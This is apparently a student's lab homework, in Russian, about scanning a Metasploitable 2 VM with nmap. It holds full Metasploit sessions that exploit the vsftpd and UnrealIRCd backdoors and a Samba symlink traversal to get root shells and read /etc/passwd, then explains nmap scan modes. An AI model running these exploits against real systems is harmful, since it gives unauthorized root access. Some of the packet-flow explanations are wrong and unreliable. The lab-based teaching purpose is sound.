# Домашнее задание к занятию 13.1. «Уязвимости и атаки на информационные системы» -  `Елена Махота`

- [Ответ к Заданию 1](#1)
- [Ответ к Заданию 2](#2)

------

### Задание 1

Скачайте и установите виртуальную машину Metasploitable: https://sourceforge.net/projects/metasploitable/.

Это типовая ОС для экспериментов в области информационной безопасности, с которой следует начать при анализе уязвимостей.

Просканируйте эту виртуальную машину, используя **nmap**.

Попробуйте найти уязвимости, которым подвержена эта виртуальная машина.

Сами уязвимости можно поискать на сайте https://www.exploit-db.com/.

Для этого нужно в поиске ввести название сетевой службы, обнаруженной на атакуемой машине, и выбрать подходящие по версии уязвимости.

Ответьте на следующие вопросы:

- Какие сетевые службы в ней разрешены?
- Какие уязвимости были вами обнаружены? (список со ссылками: достаточно трёх уязвимостей)
  
*Приведите ответ в свободной форме.*  

### *<a name = "1"> Ответ к Заданию 1 </a>*

Установила две виртуальные машины:
- kali linux
- metasploitable 2

![vm](img/img%202023-03-23%20225534.png)


Просканировала   виртуальную машину `Metasploitable 2`, используя **nmap**.

stdout
```bash
┌──(kali㉿makhota-kali)-[~]
└─$ nmap -A 192.168.56.109               
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 16:05 EDT
Nmap scan report for 192.168.56.109
Host is up (0.00099s latency).
Not shown: 977 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.56.108
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: 2023-03-23T20:04:37+00:00; -1m35s from scanner time.
53/tcp   open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-title: Metasploitable2 - Linux
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      44135/tcp   mountd
|   100005  1,2,3      55230/udp   mountd
|   100021  1,3,4      45254/tcp   nlockmgr
|   100021  1,3,4      55544/udp   nlockmgr
|   100024  1          43873/udp   status
|_  100024  1          51287/tcp   status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 29
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, LongColumnFlag, SupportsTransactions, ConnectWithDatabase, SwitchToSSLAfterHandshake, SupportsCompression, Speaks41ProtocolNew
|   Status: Autocommit
|_  Salt: =xi$uB*Js(iZelrtr_dY
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2023-03-23T20:04:37+00:00; -1m35s from scanner time.
5900/tcp open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
| irc-info: 
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
|   uptime: 0 days, 0:39:29
|   source ident: nmap
|   source host: 2D454BBB.97684684.FFFA6D49.IP
|_  error: Closing Link: uladlkckk[192.168.56.108] (Quit: uladlkckk)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2023-03-23T16:04:29-04:00
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 58m24s, deviation: 2h00m00s, median: -1m35s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.62 seconds


```

### Ответ на вопрос: Какие сетевые службы в `Metasploitable 2` разрешены?

Колонки `SERVICE`, `VERSION`

```bash
┌──(kali㉿makhota-kali)-[~]
└─$ nmap -sV 192.168.56.109                              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-25 05:58 EDT
Nmap scan report for 192.168.56.109
Host is up (0.0017s latency).
Not shown: 977 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.75 seconds

```

### Ответ на вопрос: Какие уязвимости были вами обнаружены? (список со ссылками: достаточно трёх уязвимостей)

Поиск уязвимостей по версиям сетевых служб можно выполнять на сайте https://www.exploit-db.com/ 

![exploit-db.com](img/img%202023-03-25%20125112.png)

Поиск уязвимостей по версиям сетевых служб можно выполнять с помощью иструмента `searchsploit`

![searchsploit](img/img%202023-03-25%20125542.png)

### Уязвимость 1 на 21 порту- vsftpd 2.3.4 - Backdoor Command Execution

Используем уязвимость для доступа к серверу `Metasploitable 2`

```bash
┌──(kali㉿makhota-kali)-[~]
└─$ sudo service postgresql start

┌──(kali㉿makhota-kali)-[~]
└─$  service postgresql status 
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; preset: disabled)
     Active: active (exited) since Sat 2023-03-25 06:05:52 EDT; 1min 47s ago
    Process: 61172 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 61172 (code=exited, status=0/SUCCESS)
        CPU: 2ms

Mar 25 06:05:52 makhota-kali systemd[1]: Starting postgresql.service - PostgreSQL RDBMS...
Mar 25 06:05:52 makhota-kali systemd[1]: Finished postgresql.service - PostgreSQL RDBMS.
                                                                                              
┌──(kali㉿makhota-kali)-[~]
└─$  sudo msfdb init

[i] Database already started
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema

┌──(kali㉿makhota-kali)-[~]
└─$ sudo msfconsole
                                                  

 ______________________________________________________________________________
|                                                                              |
|                          3Kom SuperHack II Logon                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 User Name:          [   security    ]                        |
|                                                                              |
|                 Password:           [               ]                        |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                       https://metasploit.com |
|______________________________________________________________________________|


       =[ metasploit v6.3.4-dev                           ]
+ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use help <command> to learn more 
about any command
Metasploit Documentation: https://docs.metasploit.com/

msf6 > db_status
[*] Connected to msf. Connection type: postgresql.

msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor                                                                              

msf6 > hosts -a 192.168.56.109
[*] Time: 2023-03-25 10:37:27 UTC Host: host=192.168.56.109
msf6 > hosts

Hosts
=====

address         mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------         ---  ----  -------  ---------  -----  -------  ----  --------
192.168.56.109

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > RHOSTS
[-] Unknown command: RHOSTS
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.109
RHOSTS => 192.168.56.109
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.56.109:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.109:21 - USER: 331 Please specify the password.
[+] 192.168.56.109:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.109:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.108:45857 -> 192.168.56.109:6200) at 2023-03-25 06:40:09 -0400

whoami
root
hostname
metasploitable
hostname -i
127.0.1.1
exit
[*] 192.168.56.109 - Command shell session 1 closed.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.56.109:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.109:21 - USER: 331 Please specify the password.
[+] 192.168.56.109:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.109:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 2 opened (192.168.56.108:44053 -> 192.168.56.109:6200) at 2023-03-25 06:44:32 -0400

hostname
metasploitable
ip a | grep eth1
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    inet 192.168.56.109/24 brd 192.168.56.255 scope global eth1
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       metasploitable.localdomain      metasploitable


```

### Уязвимость 2 на 6667 порту - 	UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)

![UnrealIRCd](img/img%202023-03-25%20143734.png)

```bash
msf6 > search UnrealIRCd

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution                                                          


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/irc/unreal_ircd_3281_backdoor                                                                        

msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/do
                                      cs/using-metasploit/basics/using-metasploit.html
   RPORT   6667             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.109
RHOSTS => 192.168.56.109
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run

[-] 192.168.56.109:6667 - Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[-] 192.168.56.109:6667 - Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set target 0
target => 0
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[-] 192.168.56.109:6667 - Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
   1   payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   2   payload/cmd/unix/bind_ruby                                   normal  No     Unix Command Shell, Bind TCP (via Ruby)
   3   payload/cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   4   payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
   5   payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   6   payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   7   payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   8   payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   9   payload/cmd/unix/reverse_ruby                                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
   10  payload/cmd/unix/reverse_ruby_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   11  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 0
payload => cmd/unix/bind_perl
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[*] 192.168.56.109:6667 - Connected to 192.168.56.109:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 192.168.56.109:6667 - Sending backdoor command...
[*] Started bind TCP handler against 192.168.56.109:4444
[*] Command shell session 1 opened (192.168.56.108:41427 -> 192.168.56.109:4444) at 2023-03-25 07:44:31 -0400

uname
Linux
hostname
metasploitable
ip a | grep eth1
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    inet 192.168.56.109/24 brd 192.168.56.255 scope global eth1
```

### Уязвимость 3 на 445 порту - 	samba_symlink_traversal

![samba](img/img%202023-03-25%20153646.png)

Samba, если он настроен с возможностью записи общим файловым ресурсом и включенными "wide links" (по умолчанию включено), также может использоваться в качестве своего рода бэкдора для доступа к файлам, которые не предназначались для совместного использования. В приведенном ниже примере модуль Metasploit используется для предоставления доступа к корневой файловой системе с помощью анонимного соединения и записываемого общего ресурса.

```bash
┌──(kali㉿makhota-kali)-[~]
└─$ smbclient -L //192.168.56.109
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            


msf6 > search samba traversal

Matching Modules
================

   #  Name                                         Disclosure Date  Rank    Check  Description
   -  ----                                         ---------------  ----    -----  -----------
   0  auxiliary/admin/smb/samba_symlink_traversal                   normal  No     Samba Symlink Directory Traversal


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/smb/samba_symlink_traversal                                     

msf6 > use 0
msf6 auxiliary(admin/smb/samba_symlink_traversal) > show options

Module options (auxiliary/admin/smb/samba_symlink_traversal):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target host(s), see https://do
                                         cs.metasploit.com/docs/using-metas
                                         ploit/basics/using-metasploit.html
   RPORT      445              yes       The SMB service port (TCP)
   SMBSHARE                    yes       The name of a writeable share on t
                                         he server
   SMBTARGET  rootfs           yes       The name of the directory that sho
                                         uld point to the root filesystem


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/smb/samba_symlink_traversal) > set RHOSTS 192.168.56.109
RHOSTS => 192.168.56.109
msf6 auxiliary(admin/smb/samba_symlink_traversal) > set SMBSHARE tmp
SMBSHARE => tmp
msf6 auxiliary(admin/smb/samba_symlink_traversal) > show options
Module options (auxiliary/admin/smb/samba_symlink_traversal):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     192.168.56.109   yes       The target host(s), see https://do
                                         cs.metasploit.com/docs/using-metas
                                         ploit/basics/using-metasploit.html
   RPORT      445              yes       The SMB service port (TCP)
   SMBSHARE   tmp              yes       The name of a writeable share on t
                                         he server
   SMBTARGET  rootfs           yes       The name of the directory that sho
                                         uld point to the root filesystem


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/smb/samba_symlink_traversal) > exploit[*] Running module against 192.168.56.109

[*] 192.168.56.109:445 - Connecting to the server...
[*] 192.168.56.109:445 - Trying to mount writeable share 'tmp'...
[*] 192.168.56.109:445 - Trying to link 'rootfs' to the root filesystem...
[*] 192.168.56.109:445 - Now access the following share to browse the root filesystem:
[*] 192.168.56.109:445 -      \\192.168.56.109\tmp\rootfs\

[*] Auxiliary module execution completed

┌──(kali㉿makhota-kali)-[~]
└─$ smbclient //192.168.56.109/tmp
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> cd rootfs
smb: \rootfs\> cd etc
smb: \rootfs\etc\> more passwd
getting file \rootfs\etc\passwd of size 1581 as /tmp/smbmore.QdC7Ta (771.9 KiloBytes/sec) (average 772.0 KiloBytes/sec)
smb: \rootfs\etc\> exit

```

![passwd](img/img%202023-03-25%20160548.png)



Использованные источники:

- Презентация "Уязвимости и атаки на информационные системы", Ирина Подборская
- https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/ 
- https://www.youtube.com/watch?v=pre9yWxjjrk&t=20s

---

### Задание 2

Проведите сканирование Metasploitable в режимах SYN, FIN, Xmas, UDP.

Запишите сеансы сканирования в Wireshark.

Ответьте на следующие вопросы:

- Чем отличаются эти режимы сканирования с точки зрения сетевого трафика?
- Как отвечает сервер?

*Приведите ответ в свободной форме.*

### *<a name = "2"> Ответ к Заданию 2 </a>*

### SYN  сканирование
это используемый по умолчанию и наиболее популярный тип сканирования. На то есть несколько причин. Он может быть быстро запущен, он способен сканировать тысячи портов в секунду при быстром соединении, его работе не препятствуют ограничивающие бранмауэры. Этот тип сканирования относительно ненавящив и незаметен, т.к. при таком сканировании TCP соединение никогда не устанавливается до конца. Он работает с любым TCP стеком, не завися от каки-либо особенностей специфичной платформы, как это происходит при сканированиях типа FIN/NULL/Xmas, Maimon и idle сканировании. Он также предоставляет ясную и достоверную дифференциацию между состояниями открыт, закрыт и фильтруется.


** Сканируем `nmap` машину `Metasploitable 2` на ip 192.168.56.110 на открытом 21 порту в режиме SYN **

```bash
┌──(kali㉿makhota-kali)-[~]
└─$ sudo nmap -sS -p 21 192.168.56.110
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-25 09:26 EDT
Nmap scan report for 192.168.56.110
Host is up (0.00049s latency).

PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 08:00:27:86:01:1F (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 7.00 seconds

```

![SIN21](img/img%202023-03-25%20162843.png)

`nmap` сканирует TCP-порт  21  vm `Metasploitable 2` через трехстороннее рукопожатие. 
1) vm `kali` отправляет пакет TCP с флагом SYN, запрашивая соединение 
2) vm `Metasploitable 2` отправляет пакет пакет TCP с флагом ACK, подтверждая соединение, и напраяляет обратно на машину `kali` запрос соединения SYN. `nmap` на основании этого ответа делает вывод о том, что порт 21 открыт.
3) vm `kali` отправляет пакет TCP с флагом RST, прерывая соединение.

** Сканируем `nmap` машину `Metasploitable 2` на ip 192.168.56.110 на закрытом 20 порту в режиме SYN **

```bash
┌──(kali㉿makhota-kali)-[~]
└─$ sudo nmap -sS -p 20 192.168.56.110
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-25 09:32 EDT
Nmap scan report for 192.168.56.110
Host is up (0.00083s latency).

PORT   STATE  SERVICE
20/tcp closed ftp-data
MAC Address: 08:00:27:86:01:1F (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds

```

![SIN20](img/img%202023-03-25%20163317.png)

`nmap` сканирует  TCP-порт  20  vm `Metasploitable 2` 
1) vm `kali` отправляет пакет TCP с флагом SYN, запрашивая соединение 
2) vm `Metasploitable 2` отправляет пакет пакет TCP с флагами  RST, ACK, ппрерывая соединение. `nmap` на основании этого ответа делает вывод о том, что порт 20 закрыт.

### FIN сканирование
Этот способ сканирования отправляет пакет с установленным флагом FIN, который используется для корректного закрытия соединения. Следовательно, цель должна ответить RST для closed портов, в соответствии с RFC.

*** Сканируем `nmap` машину `Metasploitable 2` на ip 192.168.56.110 на открытом 21 порту в режиме FIN***

```bash
┌──(kali㉿makhota-kali)-[~]
└─$ sudo nmap -sF -p 21 192.168.56.110
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-25 11:02 EDT
Nmap scan report for 192.168.56.110
Host is up (0.00036s latency).

PORT   STATE         SERVICE
21/tcp open|filtered ftp
MAC Address: 08:00:27:86:01:1F (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 7.24 seconds
                                                              
                                                               

```

![FIN21](img/img%202023-03-25%20180544.png)

`nmap` сканирует TCP-порт  21  vm `Metasploitable 2`  
1) vm `kali` отправляет пакет TCP с флагом FIN, сообщая, что соединение завершено. 
2) vm `Metasploitable 2` отправляет пакет TCP с флагом FIN, подтверждая, что соединение завершено. `nmap` на основании этого ответа делает вывод о том, что порт 21 открыт или отфильтрован. `nmap` помещает порт в это состояние, так как не может определить, открыт ли порт или отфильтрован, так как порт не дает подтверждения ACK.


*** Сканируем `nmap` машину `Metasploitable 2` на ip 192.168.56.110 на закрытом 20 порту в режиме FIN***

```bash
┌──(kali㉿makhota-kali)-[~]
└─$ sudo nmap -sF -p 20 192.168.56.110
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-25 11:17 EDT
Nmap scan report for 192.168.56.110
Host is up (0.00044s latency).

PORT   STATE  SERVICE
20/tcp closed ftp-data
MAC Address: 08:00:27:86:01:1F (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds

```

![FIN20](img/img%202023-03-25%20181802.png)


`nmap` сканирует  TCP-порт  20  vm `Metasploitable 2` 
1) vm `kali` отправляет пакет TCP с флагом FIN, сообщая, что соединение завершено. 
2) vm `Metasploitable 2` отправляет пакет пакет TCP с флагами RST, ACK, прерывая соединение. `nmap` на основании этого ответа делает вывод о том, что порт 20 закрыт.


### Xmas сканирование
Устанавливаются FIN, PSH и URG флаги. Если в ответ приходит RST пакет, то порт считается закрытым, отсутствие ответа означает, что порт открыт|фильтруется. Порт помечается как фильтруется, если в ответ приходит ICMP ошибка о недостижимости (тип 3, код 1, 2, 3, 9, 10 или 13). Ключевой особенностью  является  способность незаметно обойти некоторые не учитывающие состояние (non-stateful) брандмауэры и роутеры с функцией пакетной фильтрации. Еще одним преимуществом является то, что такое сканирование даже чуть более незаметно, чем SYN сканирование.


*** Сканируем `nmap` машину `Metasploitable 2` на ip 192.168.56.110 на открытом 21 порту в режиме Xmas***

```bash
┌──(kali㉿makhota-kali)-[~]
└─$ sudo nmap -sX -p 21 192.168.56.110
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-25 12:22 EDT
Nmap scan report for 192.168.56.110
Host is up (0.00037s latency).

PORT   STATE         SERVICE
21/tcp open|filtered ftp
MAC Address: 08:00:27:86:01:1F (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 7.14 seconds
                                                            
                                                               

```


![xmas21](img/img%202023-03-25%20193931.png)


`nmap` сканирует TCP-порт  21  vm `Metasploitable 2`  
1) vm `kali` отправляет пакет TCP с флагами FIN, PSH и URG дважды. 
2) отсутствие ответа означает, что порт открыт|фильтруется.


*** Сканируем `nmap` машину `Metasploitable 2` на ip 192.168.56.110 на закрытом 20 порту в режиме Xmas***

```bash
┌──(kali㉿makhota-kali)-[~]
└─$ sudo nmap -sX -p 20 192.168.56.110
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-25 12:41 EDT
Nmap scan report for 192.168.56.110
Host is up (0.00044s latency).

PORT   STATE  SERVICE
20/tcp closed ftp-data
MAC Address: 08:00:27:86:01:1F (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds

```

![xmas20](img/img%202023-03-25%20194305.png)


`nmap` сканирует  TCP-порт  20  vm `Metasploitable 2` 
1) vm `kali` отправляет пакет TCP с флагами FIN, PSH и URG дважды. 
2) vm `Metasploitable 2` отправляет пакет пакет TCP с флагами RST, ACK, прерывая соединение. `nmap` на основании этого ответа делает вывод о том, что порт 20 закрыт.

### UDP сканирование

UDP сканирование работает путем посылки пустого (без данных) UDP заголовка на каждый целевой порт. Если в ответ приходит ICMP ошибка о недостижимости порта (тип 3, код 3), значит порт закрыт. Другие ICMP ошибки недостижимости (тип 3, коды 1, 2, 9, 10 или 13) указывают на то, что порт фильтруется. Иногда, служба будет отвечать UDP пакетом, указывая на то, что порт открыт. Если после нескольких попыток не было получено никакого ответа, то порт классифицируется как открыт|фильтруется. Это означает, что порт может быть открыт, или, возможно, пакетный фильтр блокирует его. 



*** Сканируем `nmap` машину `Metasploitable 2` на ip 192.168.56.110 на  21 порту в режиме UDP***

```bash
┌──(kali㉿makhota-kali)-[~]
└─$ sudo nmap -sU -p 21 192.168.56.110
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-25 11:25 EDT
Nmap scan report for 192.168.56.110
Host is up (0.00035s latency).

PORT   STATE  SERVICE
21/udp closed ftp
MAC Address: 08:00:27:86:01:1F (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 7.08 seconds

```

![UDP21](img/img%202023-03-25%20182944.png)


`nmap` сканирует  порт  21 по протоколу UDP  vm `Metasploitable 2` 
1) vm `kali` отправляет UDP-пакет. 
2) vm `Metasploitable 2` отправляет обратный echo-запрос ICMP, это означает, что порт недоступен. `nmap` на основании этого ответа делает вывод о том, что порт 21 для соединения по протоколу UDP закрыт.


*** Просканируем все порты, чтобы узнать есть ли открытые UDP порты. ***

